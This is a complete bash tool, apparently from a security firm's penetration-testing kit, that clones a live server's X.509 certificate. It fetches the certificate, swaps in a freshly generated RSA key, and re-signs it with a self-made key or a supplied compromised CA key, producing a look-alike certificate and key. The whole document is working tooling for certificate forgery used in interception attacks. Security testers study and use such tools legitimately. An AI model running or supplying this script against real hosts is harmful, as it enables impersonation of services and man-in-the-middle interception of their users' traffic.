#!/bin/bash
# Adrian Vollmer, SySS GmbH 2017
# Reference:
# https://security.stackexchange.com/questions/127095/manually-walking-through-the-signature-validation-of-a-certificate

set -e

DIR="/tmp/"
KEYLENGTH=2048 # 2048 is faster, but less secure than 4096
SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"

if [ "$1" = "" ] ; then
cat <<EOF
Usage: $0 <host>:<port>|<pem-file> [<subject> <key>]

Clone an X509 certificate. The cloned certificate and the corresponding key
will be located in $DIR. Their filenames make up the output of this script.

As optional parameters, you can specifiy the distinguished name of the
subject of a certificate and the corresponding private key in PEM format.
This script will clone all certificates in the chain below the compromised
one.

If none of the certificates in the chain have a subject name that matches
the one of the certificate that you control, the subject of the cloned host
certificate will be changed accordingly and it is assumed that your
certificate is a trust anchor.
EOF
    exit 1
fi

HOST="$1"
COMPROMISED_CA="$2"
COMPROMISED_KEY="$3"

set -u

if [[ -f "$HOST" ]] ; then
    FILENAME="$(basename "$HOST")"
else
    SERVER="$(printf "%s" "$HOST" | cut -f1 -d:)"
fi

function oid() {
    # https://bugzil.la/1064636
    case "$1" in
        # "300d06092a864886f70d0101020500")
        # ;;md2WithRSAEncryption
        "300b06092a864886f70d01010b") echo sha256
        ;;#sha256WithRSAEncryption
        "300b06092a864886f70d010105") echo sha1
        ;;#sha1WithRSAEncryption
        "300d06092a864886f70d01010c0500") echo sha384
        ;;#sha384WithRSAEncryption
        "300a06082a8648ce3d040303") echo "ECDSA not supported" >&2; exit 1
        ;;#ecdsa-with-SHA384
        "300a06082a8648ce3d040302") echo "ECDSA not supported" >&2; exit 1
        ;;#ecdsa-with-SHA256
        "300d06092a864886f70d0101040500") echo md5
        ;;#md5WithRSAEncryption
        "300d06092a864886f70d01010d0500") echo sha512
        ;;#sha512WithRSAEncryption
        "300d06092a864886f70d01010b0500") echo sha256
        ;;#sha256WithRSAEncryption
        "300d06092a864886f70d0101050500") echo sha1
        ;;#sha1WithRSAEncryption
        *) echo "Unknow Hash Algorithm OID: $1" >&2
            exit 1
        ;;
    esac
}


function hexlify(){
    xxd -p -c99999
}

function unhexlify(){
    xxd -p -r
}


if [[ -f "$HOST" ]] ; then
    CLONED_CERT_FILE="$DIR$FILENAME.cert"
    CLONED_KEY_FILE="$DIR$FILENAME.key"
else
    CLONED_CERT_FILE="$DIR$HOST.cert"
    CLONED_KEY_FILE="$DIR$HOST.key"
fi
ORIG_CERT_FILE="$CLONED_CERT_FILE.orig"


if [[ -f "$HOST" ]] ; then
    cp "$HOST" "$ORIG_CERT_FILE"
else
    openssl s_client -servername "$SERVER" \
        -connect "$HOST" < /dev/null 2>&1 | \
        openssl x509 -outform PEM -out "$ORIG_CERT_FILE"
fi

OLD_MODULUS="$(openssl x509 -in "$ORIG_CERT_FILE" -modulus -noout \
    | sed -e 's/Modulus=//' | tr "[:upper:]" "[:lower:]")"
KEY_LEN="$(openssl x509  -in "$ORIG_CERT_FILE" -noout -text \
    | grep Public-Key: | grep -o "[0-9]\+")"

MY_PRIV_KEY="$DIR$HOST.$KEY_LEN.key"
MY_PUBL_KEY="$DIR$HOST.$KEY_LEN.cert"

offset="$(openssl asn1parse -in "$ORIG_CERT_FILE" | grep SEQUENCE \
    | tail -n1 |sed 's/ \+\([0-9]\+\):.*/\1/' | head -n1)"
SIGNING_ALGO="$(openssl asn1parse -in "$ORIG_CERT_FILE" \
    -strparse $offset -noout -out >(hexlify))"
offset="$(openssl asn1parse -in "$ORIG_CERT_FILE" \
    | tail -n1 |sed 's/ \+\([0-9]\+\):.*/\1/' | head -n1)"
OLD_SIGNATURE="$(openssl asn1parse -in "$ORIG_CERT_FILE" \
    -strparse $offset -noout -out >(hexlify))"
OLD_TBS_CERTIFICATE="$(openssl asn1parse -in "$ORIG_CERT_FILE" \
    -strparse 4 -noout -out >(hexlify))"

# TODO support DSA, EC
openssl req -new -newkey rsa:$KEY_LEN -days 356 -nodes -x509 \
        -subj "/C=XX" -keyout "$MY_PRIV_KEY" -out "$MY_PUBL_KEY" \
        2> /dev/null

NEW_MODULUS="$(openssl x509 -in "$MY_PUBL_KEY" -noout -modulus \
    | sed 's/Modulus=//' | tr "[:upper:]" "[:lower:]")"
NEW_TBS_CERTIFICATE="$(printf "%s" "$OLD_TBS_CERTIFICATE" \
    | sed "s/$OLD_MODULUS/$NEW_MODULUS/")"

digest="$(oid "$SIGNING_ALGO")"
NEW_SIGNATURE="$(printf "%s" "$NEW_TBS_CERTIFICATE" | unhexlify | \
    openssl dgst -$digest -sign "$MY_PRIV_KEY" | hexlify)"

openssl x509 -in "$ORIG_CERT_FILE" -outform DER | hexlify \
    | sed "s/$OLD_MODULUS/$NEW_MODULUS/" \
    | sed "s/$OLD_SIGNATURE/$NEW_SIGNATURE/" | unhexlify \
    | openssl x509 -inform DER -outform PEM > "$CLONED_CERT_FILE"

cp "$MY_PRIV_KEY" "$CLONED_KEY_FILE"
printf "%s\n" "$CLONED_KEY_FILE"
printf "%s\n" "$CLONED_CERT_FILE"
